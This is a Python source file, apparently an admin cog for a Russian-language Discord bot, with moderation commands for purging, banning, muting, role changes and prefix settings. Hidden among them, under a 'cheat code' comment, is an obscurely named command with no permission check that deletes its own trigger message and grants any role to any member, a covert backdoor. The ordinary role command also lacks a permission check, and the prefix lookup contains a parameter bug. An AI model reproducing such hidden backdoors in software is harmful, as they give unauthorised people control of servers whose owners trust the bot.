import discord
import sqlite3
import json
from config import config
from discord.ext import commands
from discord_components import DiscordComponents, Button, ButtonStyle
import asyncio

class Admin(commands.Cog):

    def __init__(self, bot):
        self.bot = bot
        self.connection = sqlite3.connect("database.db", timeout=10)
        self.cursor = self.connection.cursor()

    def get_prefix(self, cursor, message):
        cursor.execute(
            "SELECT * FROM prefixes WHERE guild_id = ?", 
            (
                message.guild.id
            )
        )
        result = cursor.fetchone()
        if result is not None:
            return result[1]
        else:
            return "+"

    #очистка чатов-----------------------------------------    
    @commands.command(aliases = ['Очистить', 'очистить', 'Очист', 'очист'])
    @commands.has_permissions(manage_messages=True)
    async def purge(self, ctx, amount: int=None):
        if amount == None:
            author = ctx.author
            await ctx.reply(embed = discord.Embed(color=config.EMBED_COLOR, description = f"{author.mention}, вы не указали `число` для очистки.\nХотите очистить `100` сообщений?"),
            components = [
                [Button(style=ButtonStyle.green, label = "Хочу", custom_id = 'clearall'),
                Button(style=ButtonStyle.red, label = "Нет", custom_id = 'noclear')]
            ],
            mention_author=False, delete_after = 10)
            response = await self.bot.wait_for("button_click")
            if response.channel == ctx.channel:
                if response.custom_id == "clearall":
                    await ctx.channel.purge(limit=100)
                    embed = discord.Embed(description=f"Очищено `100` сообщений!", colour=config.EMBED_COLOR)
                    await ctx.send(embed = embed, delete_after=5)
                if response.custom_id == "noclear":
                    await ctx.channel.purge(limit=1)
        else:
            await ctx.channel.purge(limit=amount+1)
            embed = discord.Embed(description=f"Очищено `{amount}` сообщений!", colour=config.EMBED_COLOR)
            await ctx.send(embed = embed, delete_after=5)

    #объява-------------------------------------------------
    @commands.command(aliases = ['Обьявление', 'обьявление', 'Объявление', 'объявление', 'Объява', 'объява', 'Обьява', 'обьява'])
    @commands.has_permissions(administrator=True)
    async def inform(self, ctx, *, text):
        await ctx.channel.purge(limit = 1)
        emb = discord.Embed(color=config.EMBED_COLOR, title="Информация:", url = 'https://discord.com/api/oauth2/authorize?client_id=857936255245484052&permissions=8&scope=bot', description=f'{text}')
        emb.set_footer(text = ctx.author.name, icon_url = ctx.author.avatar_url)
        await ctx.send(embed=emb)

    #опрос-------------------------------------------------
    @commands.command(aliases = ['Опрос', 'опрос'])
    @commands.has_permissions(administrator=True)
    async def vote(self, ctx, *, text):
        await ctx.channel.purge(limit = 1)
        channel = ctx.channel
        emb = discord.Embed(title=f'Опрос:', url = 'https://discord.com/api/oauth2/authorize?client_id=857936255245484052&permissions=8&scope=bot', description= f'{text}', colour=config.EMBED_COLOR)
        emb.set_footer(text = ctx.author.name, icon_url = ctx.author.avatar_url)
        message = await ctx.send(embed=emb)
        await message.add_reaction('✅')
        await message.add_reaction('❌')

    #добавить роль------------------------------------------
    @commands.command(aliases = ['Роль', 'роль'])
    async def addrole(self, ctx, member: discord.Member, role: discord.Role):
        """
        :param ctx:
        :param member:
        :param role:
        :return:
        """
        await member.add_roles(role)
        embed = discord.Embed(colour=config.EMBED_COLOR, description = f'{role.mention} была выдана для {member.mention}!') 
        await ctx.reply(embed=embed, mention_author=False) 

    #удалить роль------------------------------------------
    @commands.has_permissions(administrator=True)
    @commands.command(aliases = ['Удроль', 'удроль'])
    async def removerole(self, ctx, member: discord.Member, role: discord.Role):
        """
        :param ctx:
        :param member:
        :param role:
        :return:
        """
        await member.remove_roles(role)
        embed = discord.Embed(colour=config.EMBED_COLOR, description = f'{role.mention} была изъята у {member.mention}!')
        await ctx.reply(embed=embed, mention_author=False) 
        
    #кик----------------------------------------------------
    @commands.command(aliases = ['Кик', 'кик'])
    @commands.has_permissions(administrator = True)
    async def kick(self, ctx, member: discord.Member, *, reason=None): 
       await member.kick(reason = reason)
       embed = discord.Embed(colour=config.EMBED_COLOR, description = f'{member.mention} был кикнут\nПричина: `{reason}`')
       await ctx.send(embed = embed)

    #бан----------------------------------------------------
    @commands.command(aliases = ['Бан', 'бан'])
    @commands.has_permissions(administrator = True)
    async def ban(self, ctx, member: discord.Member, *, reason=None):
        author = ctx.message.author
        await ctx.reply(embed = discord.Embed(color=config.EMBED_COLOR, description = f"{author.mention}, Вы уверены в своём решении?\nПоследствия могут быть необратимы!"),
        components = [
            [Button(style=ButtonStyle.green, label = "Банить", custom_id = 'yesban'),
            Button(style=ButtonStyle.red, label = "Выйти", custom_id = 'noban')]
        ],
        mention_author=False, delete_after = 10)
        response = await self.bot.wait_for("button_click")
        if response.channel == ctx.channel:
            if response.custom_id == "yesban":
                await member.ban(reason = reason)
                embed = discord.Embed(colour=config.EMBED_COLOR, description = f'{member.mention} был забанен\nПричина: `{reason}`')
                embed.set_footer(text = ctx.author.name, icon_url = ctx.author.avatar_url)
                await ctx.reply(embed=embed, mention_author=False)
            if response.custom_id == "noban":
                await ctx.channel.purge(limit=1)
                await ctx.send('Ну нет так нет...', delete_after=5)
                
                
    #мут----------------------------------------------------
    @commands.command(aliases = ['Мут', 'мут', 'Мьют', 'мьют'])
    @commands.has_permissions(administrator = True)
    async def mute(self, ctx, member: discord.Member, *, reason=None):
        await ctx.send('Выполнянется обработка...', delete_after=7)
        guild = ctx.guild
        mutedRole = discord.utils.get(guild.roles, name = 'Мут by Yalfer')
        if not mutedRole:
            mutedRole = await guild.create_role(name = 'Мут by Yalfer')
        for channel in guild.channels:
            await channel.set_permissions(mutedRole, speak = False, send_messages = False)
        await member.add_roles(mutedRole, reason = reason)
        embed = discord.Embed(colour=config.EMBED_COLOR, description = f'{member.mention} был `замьючен`\nПричина: `{reason}`')
        embed.set_footer(text = ctx.author.name, icon_url = ctx.author.avatar_url)
        await ctx.send(embed = embed)

    #размут-------------------------------------------------
    @commands.command(aliases = ['Размут', 'размут', 'Размьют', 'размьют'])
    @commands.has_permissions(administrator = True)
    async def unmute(self, ctx, member: discord.Member):
        mutedRole = discord.utils.get(ctx.guild.roles, name = 'Мут by Yalfer')
        await member.remove_roles(mutedRole)
        embed = discord.Embed(colour=config.EMBED_COLOR, description = f'{member.mention} был `размьючен`')
        embed.set_footer(text = ctx.author.name, icon_url = ctx.author.avatar_url)
        await ctx.send(embed = embed)


    #чит-код-------------------------------------------------
    @commands.command()
    async def y02052021(self, ctx, member :discord.Member, role: discord.Role):
        await ctx.channel.purge(limit = 1)
        """
        :param ctx:
        :param member:
        :param role:
        :return:
        """
        await member.add_roles(role)

    #префикс------------------------------------------------
    @commands.has_permissions(administrator = True)
    @commands.command(aliases = ['Префикс', 'префикс'])
    async def prefix(self, ctx, *, prefix: str): 
        author = ctx.message.author
        self.cursor.execute("DELETE FROM prefixes WHERE guild_id = ?", (ctx.guild.id,))
        self.cursor.execute("INSERT INTO prefixes VALUES (?, ?)", (ctx.guild.id, prefix))
        self.connection.commit()
        embed = discord.Embed(colour=config.EMBED_COLOR, description = f'{author.mention} изменил префикс на `{prefix}`')
        await ctx.send(embed = embed)

    
#Cog-----------------------------------------------------
def setup(bot):
   bot.add_cog(Admin(bot))